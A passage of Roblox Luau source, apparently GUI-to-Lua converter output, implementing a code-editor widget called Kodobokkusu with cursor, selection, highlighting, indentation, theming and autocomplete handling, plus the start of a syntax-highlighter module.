			self.Lines = main.Lines
			self.Unaligned = main.Unaligned
			self.Textbox = self.Editor.Input
			self.FakeTextbox = Instance.new("TextBox")
			self.IndentationFolder = Instance.new("Folder")
			self.TextHighlightFolder = self.Textbox:FindFirstChild("SyntaxLines")
			self.HighlightsFolder = Instance.new("Folder", self.Textbox)

			self.HighlightsFolder.Name = "Highlights"

			self.Modules.Highlighter.UpdateColors({
				background = {Color = self.Data.Parent.BackgroundColor3},
			})

			repeat task.wait() until game:IsLoaded()

			--// 機能 \\--

			self.validateConfig = function(defaults, newConfig)
				for index, value in pairs(defaults) do
					if newConfig[index] == nil then
						newConfig[index] = value
					end
				end
				return newConfig
			end

			self.addConnection = function(name, connection)
				table.insert(self.Connections, {Name = name, Connection = connection})
			end

			self.removeConnection = function(name)
				for index, connection in pairs(self.Connections) do
					if connection.Name == name and connection.Connection then
						connection.Connection:Disconnect()
						table.remove(self.Connections, index)
					end
				end
			end

			self.cleanConnections = function()
				for index, connection in pairs(self.Connections) do
					if connection.Connection then
						connection.Connection:Disconnect()
					end
				end
				self.Connections = {}
			end

			self.getInputed = function()
				if self.States.IsTyping or self.States.RemovingText or self.States.AddingText or self.States.MovingCursor then
					return true
				end

				return false
			end

			self.updateStates = function()
				if #self.Textbox.Text < self.Values.LastText then
					self.States.RemovingText = true
					self.States.AddingText = false
				elseif #self.Textbox.Text > self.Values.LastText then
					self.States.RemovingText = false
					self.States.AddingText = true
				elseif #self.Textbox.Text == self.Values.LastText then
					self.States.RemovingText = false
					self.States.AddingText = false
				end

				self.States.IsTyping = true
				self.Values.TypingTick = 0
			end

			self.getAutocompleteVisible = function(cursor)
				if self.States.AutocompleteEnabled then
					local getSuggestion = self.Modules.Autocomplete:getWordAtCursor(self.Textbox.CursorPosition)
					if getSuggestion then
						if (not cursor) and (not self.Services.UserInputService.TouchEnabled) then
							self.Modules.Autocomplete:setFrameVisible(true)
						end
					else
						spawn(function()
							if self.States.AutocompleteWasVisible then
								self.Modules.Autocomplete:setFrameVisible(false)
							end
						end)
					end
				else
					self.States.AutocompleteWasVisible = false
					self.Modules.Autocomplete:setFrameVisible(false)
				end
			end

			self.setAutocompleteEnabled = function(boolean)
				if boolean then
					self.States.AutocompleteEnabled = true
				else
					self.States.AutocompleteEnabled = false
					self.States.AutocompleteWasVisible = false
					self.Modules.Autocomplete:setFrameVisible(false)
				end
			end

			self.textUpdate = function()
				self.updateStates()

				self.Modules.Lines:update({
					speed = self.Config.CURSOR_SPEED,
				})
				self.Modules.Highlighter.Highlight(self.Textbox, self.Textbox.Text, self.Config.HIGHLIGHT_MODE)

				if self.States.Focused then
					if self.Services.UserInputService.TouchEnabled then
						task.spawn(function()
							self.setSyntaxVisible(false)
						end)
					end
				end
				task.spawn(function()
					for _, func in ipairs(self._onEditFunctions) do
						if not (type(func) == "function") then
							return
						end
						func()
					end
				end)

				self.getAutocompleteVisible()
				self.updateIndentationGuide()
			end

			self.cursorUpdate = function()
				self.States.MovingCursor = true
				self.Values.LastCursorPosition = self.Textbox.CursorPosition + 1

				self.getAutocompleteVisible(true)

				task.spawn(function()
					if not self.States.Focused then
						self.FakeTextbox.CursorPosition = -1 else
						self.FakeTextbox.CursorPosition = self.Textbox.CursorPosition
					end

					if self.FakeTextbox.CursorPosition == -1 then
						return
					end

					self.Modules.CustomInput:update({
						focused = self.States.Focused,
						isInputed = self.getInputed(),
						speed = self.Config.CURSOR_SPEED,
					})
					self.Modules.Lines:update({
						speed = self.Config.CURSOR_SPEED,
					})

					local cursorPos = self.Textbox.CursorPosition - 1
					local cursorLines = (cursorPos > #self.Textbox.Text and self.Textbox.Text .. (" "):rep(cursorPos - #self.Textbox.Text) or self.Textbox.Text):sub(0, cursorPos):split("\n")
					local cursorLineText = cursorLines[#cursorLines]
					local cursorWidth = self.Services.TextService:GetTextSize(cursorLineText, self.Textbox.TextSize, self.Textbox.Font, Vector2.new(math.huge, math.huge)).X

					self.Modules.Autocomplete:setPosition({
						position = UDim2.new(0,cursorWidth,0, self.Values.TextSize.Y * (#cursorLines - 1) + self.Values.TextSize.Y + 3),
						speed = self.Config.CURSOR_SPEED,
					})

					while self.States.HoldingDownMouse do
						if tick() - self.Values.StartDragTime >= 1 then
							self.States.MouseDragging = true
							self.updateCanvasPos()
						end
						task.wait()
					end
					self.States.MouseDragging = false
				end)

				spawn(function()
					task.wait()
					self.Values.LastCursorPosition = self.Textbox.CursorPosition
				end)
			end

			self.updateSelection = function(startIndex, endIndex)
				for _, frame in pairs(self._selectionFrames) do
					frame:Destroy()
				end
				self._selectionFrames = {}

				local function getPosOfChar(arg1)
					local textObject = arg1.textObject
					local char = arg1.char
					if char < 0 or textObject == nil then
						return Vector2.zero
					end
					local string_sub_result1 = string.sub(arg1.text, 1, char - 1)
					local string_split_result1 = string.split(string_sub_result1, '\n')
					local TextSize = textObject.TextSize
					local GetTextBoundsParams = Instance.new("GetTextBoundsParams")
					GetTextBoundsParams.Text = string_split_result1[#string_split_result1]..string.rep('X', char - #string_sub_result1 - 1)
					GetTextBoundsParams.Font = textObject.FontFace
					GetTextBoundsParams.Size = TextSize
					GetTextBoundsParams.Width = math.huge
					return Vector2.new(self.Services.TextService:GetTextBoundsAsync(GetTextBoundsParams).X, (#string_split_result1 - 1) * TextSize)
				end

				local textObject = self.Textbox
				if not textObject then return end

				local fullText = textObject.Text
				if startIndex < 0 or endIndex < 0 then return end

				local selectionStart = math.min(startIndex, endIndex)
				local selectionEnd = math.max(startIndex, endIndex)
				local selectedText = string.sub(fullText, selectionStart, selectionEnd)

				local startCharInfo = { char = selectionStart, text = selectedText, textObject = textObject }
				local endCharInfo = { char = selectionEnd, text = selectedText, textObject = textObject }

				local startPos = getPosOfChar(startCharInfo)
				local endPos = getPosOfChar(endCharInfo)

				if startPos.Y == endPos.Y then
					local highlightFrame = Instance.new("Frame")
					highlightFrame.AnchorPoint = Vector2.new(0, 0)
					highlightFrame.Name = "Selection"
					highlightFrame.BorderSizePixel = 0
					highlightFrame.ZIndex = 0
					highlightFrame.BackgroundTransparency = 0.75
					highlightFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
					highlightFrame.Size = UDim2.new(0, endPos.X - startPos.X, 0, self.Values.TextSize.Y)
					highlightFrame.Position = UDim2.new(0, startPos.X+10, 0, startPos.Y+5)
					highlightFrame.Parent = textObject.Parent

					table.insert(self._selectionFrames, highlightFrame)
					return
				end

				local selectedLines = string.split(selectedText, '\n')

				for lineIndex, lineText in ipairs(selectedLines) do
					local lineStartX = (lineIndex == 1) and startPos.X or 0
					local lineY = startPos.Y + (lineIndex - 1) * textObject.TextSize

					local textWidth = self.Services.TextService:GetTextSize(lineText, textObject.TextSize, textObject.Font, Vector2.new(math.huge, math.huge)).X

					local highlightFrame = Instance.new("Frame")
					highlightFrame.AnchorPoint = Vector2.new(0, 0)
					highlightFrame.Name = "Line_" .. lineIndex
					highlightFrame.BorderSizePixel = 0
					highlightFrame.ZIndex = 0
					highlightFrame.BackgroundTransparency = 0.75
					highlightFrame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
					highlightFrame.Size = UDim2.new(0, textWidth, 0, textObject.TextSize)
					highlightFrame.Position = UDim2.new(0, lineStartX+10, 0, lineY+5)
					highlightFrame.Parent = textObject.Parent

					table.insert(self._selectionFrames, highlightFrame)
				end
			end

			self.updateWordHighlights = function()
				self.clearWordHighlights()

				local text = self.Textbox.Text
				local cursorPos = self.Textbox.CursorPosition
				local selectionStart = self.Textbox.SelectionStart

				if cursorPos == -1 or selectionStart == -1 then
					return
				end

				local startPos = math.min(cursorPos, selectionStart)
				local endPos = math.max(cursorPos, selectionStart)

				if endPos > #text then
					endPos = #text
				end

				local selectedWord = string.sub(
					self.Textbox.Text,
					startPos,
					endPos
				)

				if #selectedWord == 0 or not selectedWord:match("^%w+$") then
					return
				end

				local searchPos = 1
				task.spawn(pcall, function()
					while true do
						local matchStart, matchEnd = text:find(selectedWord, searchPos, true)
						if not matchStart then break end
						searchPos = matchEnd + 1

						local prefix = text:sub(1, matchStart - 1)
						local wordText = text:sub(matchStart, matchEnd)
						local wordSize = self.Services.TextService:GetTextSize(wordText, self.Textbox.TextSize, self.Textbox.Font, Vector2.new(math.huge, math.huge))

						local prefixLines = select(2, prefix:gsub("\n", ""))
						local yPos = self.Values.TextSize.Y * prefixLines

						local prefixStart = prefix:match("[^\n]*$")

						local highlight = Instance.new("Frame")
						highlight.BackgroundColor3 = self.Theme.OUTLINE
						highlight.BackgroundTransparency = .5
						highlight.BorderSizePixel = 0
						highlight.Size = UDim2.new(0, wordSize.X, 0, wordSize.Y)
						highlight.Position = UDim2.new(0, self.Services.TextService:GetTextSize(prefixStart, self.Textbox.TextSize, self.Textbox.Font, Vector2.new(math.huge, math.huge)).X, 0, yPos)
						highlight.ZIndex = self.Textbox.ZIndex + 1
						highlight.Parent = self.HighlightsFolder

						local outline = Instance.new("UIStroke", highlight)
						outline.Color = self.Theme.OUTLINE

						table.insert(self._wordHighlights, highlight)

						if #self._wordHighlights >= 25 then
							highlight:Destroy()
						end
						task.wait()
					end
				end)
			end

			self.clearWordHighlights = function()
				for _, highlight in ipairs(self._wordHighlights) do
					if type(highlight) ~= "number" then
						if highlight:IsA("Frame") then
							highlight:Destroy()
						end
					end
				end
				self._wordHighlights = {}
			end

			self.setSyntaxVisible = function(boolean)
				self.TextHighlightFolder = self.Textbox:FindFirstChild("SyntaxLines")
				self.States.SyntaxVisible = boolean

				self.Modules.CustomInput:setVisible(boolean)

				if self.TextHighlightFolder then
					if self.TextHighlightFolder:IsA("TextLabel") then
						self.TextHighlightFolder.Visible = boolean
					end

					for _, label in ipairs(self.TextHighlightFolder:GetChildren()) do
						local name = string.lower("Line_")
						if string.lower(label.Name:sub(1,5)) == name then
							label.Visible = boolean
						end
					end
					for _, indentation in ipairs(self.IndentationFolder:GetChildren()) do
						if indentation:IsA("Frame") then
							indentation.Visible = boolean
						end
					end
				end
			end

			self.changeTheme = function(theme)
				theme = self.validateConfig(self.Theme, theme or {})

				codeEditor.Main.Lines.Label.TextColor3 = theme.SHADED_TEXT
				codeEditor.Main.Lines.Label.UIStroke.Color = theme.OUTLINE

				codeEditor.Others.Hidden.Icon.ImageColor3 = theme.THEME_COLOR
				codeEditor.Others.Hidden.TextLabel.TextColor3 = theme.TEXT_COLOR

				self.Lines.Size = UDim2.new(0, theme.LINES_X_SIZE, 1, 0)
				self.Lines.Label.Size = UDim2.new(0, theme.LINES_X_SIZE, 1, 0)

				if self.Editor.CanvasPosition.X > 0 and theme.LINES_SHADOW_ENABLED then
					self.Lines.BackgroundTransparency = 0 
					self.Unaligned.Shadow.DropShadow.ImageTransparency = theme.LINES_SHADOW_TRANSPARENCY
				else
					self.Lines.BackgroundTransparency = 1
					self.Unaligned.Shadow.DropShadow.ImageTransparency = 1
				end

				self.Modules.Lines:changeTheme(theme)
				self.Modules.Autocomplete:changeTheme(theme)
				self.Modules.CustomInput:changeTheme(theme)

				self.Theme = theme
			end

			self.findFoldableBlocks = function(text)
				local blocks = {}
				local stack = {}
				local lines = string.split(text, "\n")

				for i, line in ipairs(lines) do
					for _, pattern in ipairs(self._foldablePattenrs) do
						local startPattern, endPattern = pattern[1], pattern[2]

						if string.match(line, startPattern) then
							table.insert(stack, {start = i, endPattern = endPattern})
						elseif string.match(line, endPattern) then
							local block = table.remove(stack)
							if block then
								block["end"] = i
								table.insert(blocks, block)
							end
						end
					end
				end
				return blocks
			end

			self.applyFolding = function(textbox, blocks)
				local lines = string.split(textbox.Text, "\n")
				local folded = {}

				for _, block in ipairs(blocks) do
					local start, stop = block.start, block["end"]
					lines[start] = self.Config.FOLD_MARKER .. lines[start]
					for i = start + 1, stop do
						folded[i] = true
					end
				end

				local newText = {}
				for i, line in ipairs(lines) do
					if not folded[i] then
						table.insert(newText, line)
					end
				end

				textbox.Text = table.concat(newText, "\n")
			end

			self.updateIndentationGuide = function()
				self.IndentationFolder.Parent = self.Textbox
				self.IndentationFolder.Name = "IndentLines"

				for _, child in pairs(self.IndentationFolder:GetChildren()) do
					if child:IsA("Frame") and child.Name == "IndentLine" then
						child:Destroy()
					end
				end

				local lines = self.Textbox.Text:split("\n")
				for lineIndex, line in ipairs(lines) do
					local indentationLevel = 0

					for char in line:gmatch(".") do
						if char == " " then
							indentationLevel += 0.25
						elseif char == "\t" or char == "" then
							indentationLevel += 1
						else
							break
						end
					end

					for i = 1, math.floor(indentationLevel) do
						i -= 1

						task.spawn(function()
							repeat task.wait() until type(self.Values.TextSize) ~= "number"
							local spaceBounds = self.Services.TextService:GetTextSize(" ", self.Values.TextSize.Y, self.Textbox.Font, Vector2.new(math.huge, math.huge))

							local mult = 3.75

							local indentLine = Instance.new("Frame")
							indentLine.Name = "IndentLine"
							indentLine.Size = UDim2.new(0, 1, 0, self.Values.TextSize.Y + 2)
							indentLine.Position = UDim2.new(0, (i * (spaceBounds.X*mult)+(i*2))-(mult/2), 0, (lineIndex - 1) * self.Values.TextSize.Y)
							indentLine.BackgroundColor3 = self.Theme.OUTLINE
							indentLine.BackgroundTransparency = .5
							indentLine.BorderSizePixel = 0
							indentLine.Parent = self.IndentationFolder
							indentLine.ZIndex = self.Textbox.ZIndex + 1
						end)
					end
				end
			end

			self.updateCanvasPos = function()
				local cursorPos = self.Textbox.CursorPosition - 1
				local cursorLines = (cursorPos > #self.Textbox.Text and self.Textbox.Text .. (" "):rep(cursorPos - #self.Textbox.Text) or self.Textbox.Text):sub(0, cursorPos):split("\n")

				pcall(function()
					self.Modules.Shared:tween(self.Editor, TweenInfo.new(self.Config.HOLD_DOWN_SMOOTHNESS), {
						CanvasPosition = Vector2.new(self.Editor.CanvasPosition.X, (self.Values.TextSize.Y * (#cursorLines - 1)) - (self.Values.TextSize.Y * 4)   )}
					)
				end)
			end

			--// スクリプト \\--
			self.Modules.Lines:set({
				textbox = self.Textbox,
				label = self.Lines.Label,
				editor = self.Editor,
				theme = self.Theme,
			})
			self.Modules.CustomInput:set({
				textbox = self.Textbox,
				theme = self.Theme,
			})
			self.Modules.Indenter:set({
				textbox = self.Textbox,
			})
			self.Modules.Autocomplete:set({
				textbox = self.Textbox,
			})

			self.textUpdate()
			self.cursorUpdate()

			--// 入力 \\--
			self.addConnection("ParentDestroyed", self.Data.Parent.Destroying:Connect(function()
				self:Destroy()
			end))
			self.addConnection("InputBegan", self.Services.UserInputService.InputBegan:Connect(function(input)
				if not self.States.Focused then return end
				if input.KeyCode == Enum.KeyCode.Tab then
					spawn(function()
						self.Modules.Indenter:updateMousePos()
					end)
				end
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					self.States.HoldingDownMouse = true
					self.States.IsSelecting = true

					--self.updateSelection(0, 0)
					self.Values.SelectionStart = self.Textbox.CursorPosition
				end
				if input.KeyCode == Enum.KeyCode.Backspace then
					self.States.RemovingText = true

					local text = self.Modules.Shared:removeControlBytes(self.Textbox.Text)
					local afterChar = string.sub(text, self.Textbox.CursorPosition, self.Textbox.CursorPosition)
					local beforeChar = string.sub(self.Modules.Shared:removeControlBytes(self.Values.BeforeText), self.Textbox.CursorPosition, self.Textbox.CursorPosition)

					for index, value in pairs(self.Brackets) do
						if beforeChar == index and afterChar == value then
							self.Textbox.Text = string.sub(text, 1, self.Textbox.CursorPosition - 1)..string.sub(text, self.Textbox.CursorPosition+1)
							self.Values.BeforeText = self.Textbox.Text
						end
					end
				end
				if input.KeyCode == Enum.KeyCode.Return then
					self.Textbox:CaptureFocus()
					self.Modules.Indenter:indentBrackets()

			--[[
			local allLines = self.Textbox.Text:split("\n")
			local currentLine = #allLines

			local newIndentation = self.Modules.Indenter:autoIndent(currentLine, allLines)

			local cursorPos = self.Textbox.CursorPosition + 1
			local textBeforeCursor = self.Textbox.Text:sub(1, cursorPos)
			local textAfterCursor = self.Textbox.Text:sub(cursorPos + 1)
			
			if newIndentation ~= nil or newIndentation ~= "" then
				self.Textbox.Text = textBeforeCursor .. "" .. newIndentation .. textAfterCursor
				self.Textbox.CursorPosition = cursorPos + (#newIndentation)
			end
			]]
				end
				if input.KeyCode == Enum.KeyCode.Up then
					self.States.KeybindScrolling = true
					local numText = self.Modules.Autocomplete:selectUp()
					if self.States.AutocompleteWasVisible then
						local numText = self.Modules.Autocomplete:selectDown()
						self.Textbox.CursorPosition = self.Values.LastCursorPosition + (numText or 0) + 1
						spawn(function()
							self.Modules.Autocomplete:setFrameVisible(true)
						end)
					end
				end
				if input.KeyCode == Enum.KeyCode.Down then
					self.States.KeybindScrolling = true
					local numText = self.Modules.Autocomplete:selectDown()
					if self.States.AutocompleteWasVisible then
						local numLines = self:CountLines()
						local subText = self.Textbox.Text:sub(1, self.Textbox.CursorPosition - 1)
						local currentLine = #subText:split("\n")
						local reposition = 1

						if numLines > 1 then
							reposition = 0 else
							reposition = 2
						end
						if (currentLine == numLines) and numLines > 1 then
							reposition = 1
						end

						self.Textbox.CursorPosition = (numText or self.Textbox.CursorPosition) + reposition
						spawn(function()
							self.Modules.Autocomplete:setFrameVisible(true)
						end)
					end
				end
			end))

			self.addConnection("InputChanged", self.Services.UserInputService.InputChanged:Connect(function(input)
				if self.States.IsSelecting and input.UserInputType == Enum.UserInputType.MouseMovement then
					self.Values.SelectionEnd = self.Textbox.CursorPosition
					--self.updateSelection(self.Values.SelectionStart, self.Values.SelectionEnd)
				end
			end))

			self.addConnection("InputEnded", self.Services.UserInputService.InputEnded:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 then
					self.States.HoldingDownMouse = false
					self.States.IsSelecting = false
				end
				if input.KeyCode == Enum.KeyCode.Up or input.KeyCode == Enum.KeyCode.Down then
					self.States.KeybindScrolling = false
				end
			end))

			--// イベント \\--
			self.addConnection("TextboxEdited", self.Textbox:GetPropertyChangedSignal("Text"):Connect(function()
				self.textUpdate()

				self.Textbox.CursorPosition = self.Values.LastCursorPosition - 1

				if not self.States.WasWritten then
					if not self.States.RemovingText then
						self.Modules.Autocomplete:completeBracket({
							autocompleteCharacters = self.Brackets,
							debounce = self.States.AutoCloseBracketDebounce,
							focused = self.States.Focused,
						})
					end
					self.States.AutoCloseBracketDebounce = false

					self.States.AutocompleteWasVisible = self.Modules.Autocomplete:isVisible()

					spawn(function()
						task.wait()
						self.Values.BeforeText = self.Textbox.Text
					end)
				end
			end))
			self.addConnection("PlaceholderEdited", self.Data.Parent:GetPropertyChangedSignal("BackgroundColor3"):Connect(function()
				self.Textbox.PlaceholderColor3 = self.Data.Parent.BackgroundColor3
			end))
			self.addConnection("TextboxCursorChanged", self.Textbox:GetPropertyChangedSignal("CursorPosition"):Connect(function()
				self.cursorUpdate()
				self.updateWordHighlights()
				spawn(function()
					self.States.AutocompleteWasVisible = self.Modules.Autocomplete:isVisible()
					task.wait()
					if self.Modules.Autocomplete:isVisible() then
						self.States.AutocompleteWasVisible = true
					else
						self.States.AutocompleteWasVisible = false
						self.Modules.Autocomplete:setSelected(false)
					end
				end)
			end))
			self.addConnection("TextboxFocused", self.Textbox.Focused:Connect(function()
				self.States.Focused = true
				self.cursorUpdate()
				self.Modules.Autocomplete:setFrameVisible(false)
				if self.Services.UserInputService.TouchEnabled then
					self.setSyntaxVisible(false)
				end
			end))
			self.addConnection("TextboxFocuslost", self.Textbox.FocusLost:Connect(function(enterPressed)
				self.States.Focused = false
				if self.Modules.Autocomplete:isVisible() then
					if enterPressed then
						self.Modules.Autocomplete:completeWord()
					end
					self.Modules.Autocomplete:setFrameVisible(false)
				end
				self.cursorUpdate()
				if self.Services.UserInputService.TouchEnabled then
					self.setSyntaxVisible(true)
				end
			end))
			self.addConnection("SelectionStart", self.Textbox:GetPropertyChangedSignal("SelectionStart"):Connect(function()
				self.updateWordHighlights()
			end))
			self.addConnection("CanvasSizeChanged", self.Editor:GetPropertyChangedSignal("CanvasSize"):Connect(function()
				self.updateCanvasPos()
			end))
			self.addConnection("CanvasPositionChanged", self.Editor:GetPropertyChangedSignal("CanvasPosition"):Connect(function()
				if self.Editor.CanvasPosition.X > 0 and self.Theme.LINES_SHADOW_ENABLED then
					self.Lines.BackgroundTransparency = 0 
					self.Unaligned.Shadow.DropShadow.ImageTransparency = self.Theme.LINES_SHADOW_TRANSPARENCY
				else
					self.Lines.BackgroundTransparency = 1
					self.Unaligned.Shadow.DropShadow.ImageTransparency = 1
				end
			end))
			self.addConnection("Rendered", self.Services.RunService.RenderStepped:Connect(function()
				self.Values.LastText = #self.Textbox.Text

				self.States.Focused = self.Textbox:IsFocused()

				self.Lines.CanvasSize = UDim2.new(0, 0, 0, self.Editor.CanvasSize.Y.Offset)
				self.Lines.CanvasPosition = Vector2.new(0, self.Editor.CanvasPosition.Y)

				self.Editor.Size = UDim2.new(1, -self.Lines.AbsoluteSize.X, 1, 0)
				self.Unaligned.Shadow.Size = UDim2.new(0, self.Lines.AbsoluteSize.X, 1, 0)

				self.Values.TextSize = self.Services.TextService:GetTextSize("", self.Textbox.TextSize, self.Textbox.Font, Vector2.new());

				self.Textbox.TextSize = self.Config.TEXT_SIZE
				self.Lines.Label.TextSize = self.Config.TEXT_SIZE

				self.Lines.Label.Font = self.Textbox.Font

				self.Editor.ZIndex = self.Data.Parent.ZIndex
				self.Textbox.ZIndex = self.Data.Parent.ZIndex
				self.Lines.ZIndex = self.Data.Parent.ZIndex + 5
				self.Lines.Label.ZIndex = self.Data.Parent.ZIndex + 6
				self.Unaligned.Shadow.DropShadow.ZIndex = self.Data.Parent.ZIndex + 3
				self.Others.Hidden.Icon.ZIndex = self.Data.Parent.ZIndex + 4
				self.Others.Hidden.TextLabel.ZIndex = self.Data.Parent.ZIndex + 4

				self.Lines.BackgroundColor3 = self.Data.Parent.BackgroundColor3
				self.Unaligned.Shadow.DropShadow.ImageColor3 = self.Theme.SHADOW_COLOR

				if self.States.KeybindScrolling then
					self.updateCanvasPos()
				end

				if self.States.Focused then
					if self.States.PreventFocus == true then
						self.Textbox:ReleaseFocus()
					end
				end

				if self.getInputed() and not self.States.FocusedFirst then
					if self.Values.TypingTick >= 25 then
						self.States.IsTyping = false
						self.States.AddingText = false
						self.States.RemovingText = false
						self.States.MovingCursor = false

						self.Values.TypingTick = 0
						self.Modules.CustomInput:update({
							focused = self.States.Focused,
							isInputed = self.States.IsTyping,
							speed = self.Config.CURSOR_SPEED,
						})
						return
					end
					self.Values.TypingTick += 1
				else
					self.States.FocusedFirst = false
				end

				if not self.States.AutoCloseBracketDebounce then
					self.States.AutoCloseBracketDebounce = true
				end
				if not self.States.SyntaxVisible then
					self.Textbox.TextColor3 = self.Modules.Highlighter.TokenColors.iden.Color
					self.Textbox.TextTransparency = 0
				else
					self.Textbox.TextColor3 = self.Data.Parent.BackgroundColor3
					self.Textbox.TextTransparency = .5
				end
			end))

			self.Values.LastText = #self.Textbox.Text
			self.Values.LastCursorPosition = #self.Textbox.Text + 1
			self.Values.BeforeText = self.Textbox.Text
			self.Textbox.PlaceholderColor3 = self.Data.Parent.BackgroundColor3
			self.Lines.Size = UDim2.new(0, self.Theme.LINES_X_SIZE, 1, 0)
			self.Lines.Label.Size = UDim2.new(0, self.Theme.LINES_X_SIZE, 1, 0)
			--self.Textbox.TextColor3 = self.Data.Parent.BackgroundColor3

			self.changeTheme()

			return self
		end

		-- // 方法 \\ --
		function Kodobokkusu:Write(text)
			self.States.WasWritten = true

			self.Textbox.Text = text
			self.Textbox.CursorPosition = #self.Textbox.Text

			spawn(function()
				task.wait()
				self.States.WasWritten = false
			end)
		end

		function Kodobokkusu:Hide()
			self.Main.Visible = false
			self.Others.Hidden.Visible = true

			self.Others.Hidden.Icon.ImageTransparency = 1
			self.Others.Hidden.TextLabel.TextTransparency = 1
			self.Others.Hidden.Icon.Position = UDim2.new(.5, 0, .4, 0)
			self.Others.Hidden.TextLabel.Position = UDim2.new(.5, 0, .6, 0)

			self.Modules.Shared:tween(self.Others.Hidden.Icon, TweenInfo.new(.5), {
				ImageTransparency = 0,
				Position = UDim2.new(.5, 0, .3, 0),
			})
			self.Modules.Shared:tween(self.Others.Hidden.TextLabel, TweenInfo.new(.5), {
				TextTransparency = 0,
				Position = UDim2.new(.5, 0, .55, 0)
			})
		end

		function Kodobokkusu:Unhide()
			self.Main.Visible = true

			self.Modules.Shared:tween(self.Others.Hidden.Icon, TweenInfo.new(.5), {
				ImageTransparency = 1,
				Position = UDim2.new(.5, 0, .4, 0),
			})
			self.Modules.Shared:tween(self.Others.Hidden.TextLabel, TweenInfo.new(.5), {
				TextTransparency = 1,
				Position = UDim2.new(.5, 0, .6, 0)
			})
			task.spawn(pcall, function()
				task.wait(.5)
				if self.Main.Visible then
					self.Others.Hidden.Visible = false
				end
			end)
		end

		function Kodobokkusu:Clear()
			self:Write("")
			self.Textbox:ReleaseFocus()

			task.spawn(pcall, function()
				task.wait()
				self.Textbox:ReleaseFocus()
			end)
		end

		function Kodobokkusu:ChangeSyntaxColor(colors)
			self.Modules.Highlighter.UpdateColors(colors)
		end

		function Kodobokkusu:ChangeTheme(themeTable)
			self.changeTheme(themeTable)
		end

		function Kodobokkusu:ChangeHighlightMode(mode)
			local lastText = self:GetText()

			self.Config.HIGHLIGHT_MODE = string.lower(mode)
			self.Modules.Highlighter.Highlight(self.Textbox, self.Textbox.Text, self.Config.HIGHLIGHT_MODE)
		end

		function Kodobokkusu:SetCursorSpeed(speed)
			self.Config.CURSOR_SPEED = speed
		end

		function Kodobokkusu:SetCursorPosition(position)
			self.Textbox.CursorPosition = position
		end

		function Kodobokkusu:SetTextSize(size)
			self.Config.TEXT_SIZE = size
		end

		function Kodobokkusu:SetFont(font)
			self.Textbox.Font = font
		end

		function Kodobokkusu:SetTextEditable(boolean, preventFocus : boolean?)
			self.Textbox.TextEditable = boolean
			self.States.PreventFocus = preventFocus
		end

		function Kodobokkusu:SetAutocompleteEnabled(boolean)
			self.setAutocompleteEnabled(boolean)
		end

		function Kodobokkusu:SetLinesVisible(boolean)
			if boolean then
				self.Lines.Visible = true
				self.Unaligned.Shadow.Visible = true
				self.Editor.Size = UDim2.new(1, -50, 1, 0)
			else
				self.Lines.Visible = false
				self.Unaligned.Shadow.Visible = false
				self.Editor.Size = UDim2.new(1, 0, 1, 0)
			end
		end

		function Kodobokkusu:ChangeLanguage(module)
			if not module then
				return
			end
			local library = module:FindFirstChild("Library") or module:FindFirstChild("Language")
			self.Modules.Highlighter.ChangeLang(require(module))
			self.Modules.Autocomplete:changeLang(require(library))
		end

		function Kodobokkusu:Beautify()
			self.Textbox.Text = self.Modules.Beautify(self.Textbox.Text)
		end

		function Kodobokkusu:Obfuscate()
			self.Textbox.Text = self.Modules.Obfuscate(self.Textbox.Text)
		end

		function Kodobokkusu:GetPropertyChangedSignal(prop)
			return self.Textbox:GetPropertyChangedSignal(prop)
		end

		-- // フェッチメソッド \\ --
		function Kodobokkusu:GetText()
			return self.Textbox.Text
		end

		function Kodobokkusu:GetCursorPos()
			return self.Textbox.CursorPosition
		end

		function Kodobokkusu:CountLines()
			return #self.Textbox.Text:split("\n")
		end

		function Kodobokkusu:OnEdit(func)
			table.insert(self._onEditFunctions, func)
		end

		function Kodobokkusu:Destroy()
			self.cleanConnections()
			self.CodeEditor:Destroy()
			self._onEditFunctions = {}
			self.Connections = {}
		end

		return Kodobokkusu

	end;
};
G2L_MODULES[G2L["3e"]] = {
	Closure = function()
		local script = G2L["3e"];local Lexer = require(script.Lexer)

		local TextService = game:GetService("TextService")

		local tokenColors = table.create(8)
		local tokenFormats = table.create(7)
		local activeLabels = table.create(3)

		local currentTextbox = nil
		local lastMode = nil

		local function sanitizeRichText(s)
			return string.gsub(string.gsub(string.gsub(string.gsub(string.gsub(s,
				"&", "&amp;"),
				"<", "&lt;"),
				">", "&gt;"),
				"\"", "&quot;"),
				"'", "&apos;"
			)
		end

		local function sanitizeTabs(s)
			return string.gsub(s, "\t", "    ")
		end

		local function sanitizeControl(s)
			return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
		end

		local function highlight(textObject, src, mode)
			src = sanitizeTabs(sanitizeControl(src or textObject.Text))

			local CHARACTER_LIMIT = 64000

			if mode then
				lastMode = mode
			end
			mode = mode or lastMode or "single"

			textObject.RichText = false
			textObject.Text = src
			textObject.TextXAlignment = Enum.TextXAlignment.Left
			textObject.TextYAlignment = Enum.TextYAlignment.Top
			textObject.TextColor3 = tokenColors.background.Color
			textObject.TextTransparency = .5

			if mode == "single" then
				local highlightBox = textObject:FindFirstChild("SyntaxLines")
				if highlightBox and highlightBox:IsA("Folder") then
					highlightBox:Destroy()
					highlightBox = nil
				end
				if not highlightBox then
					highlightBox = Instance.new("TextLabel", textObject)
					highlightBox.BackgroundTransparency = 1
					highlightBox.Name = "SyntaxLines"
					highlightBox.RichText = true
					highlightBox.Size = UDim2.new(1, 0, 0, 0)
					highlightBox.AutomaticSize = Enum.AutomaticSize.Y
					highlightBox.ZIndex = textObject.ZIndex + 1
				end

				highlightBox.RichText = true
				highlightBox.TextXAlignment = Enum.TextXAlignment.Left
				highlightBox.TextYAlignment = Enum.TextYAlignment.Top
				highlightBox.TextColor3 = tokenColors.iden.Color
				highlightBox.TextSize = textObject.TextSize
				highlightBox.Font = textObject.Font
				highlightBox.TextWrapped = false
				highlightBox.AutomaticSize = Enum.AutomaticSize.Y
				highlightBox.ZIndex = textObject.ZIndex + 2

				local richText = {}

				for token, content in Lexer.scan(src) do
					local Color = tokenColors[token] or tokenColors.iden.Color
					local sanitizedText = sanitizeRichText(content)

					if Color ~= tokenColors.iden.Color and string.find(sanitizedText, "[%S%C]") then
						table.insert(richText, string.format(tokenFormats[token], sanitizedText))
					else
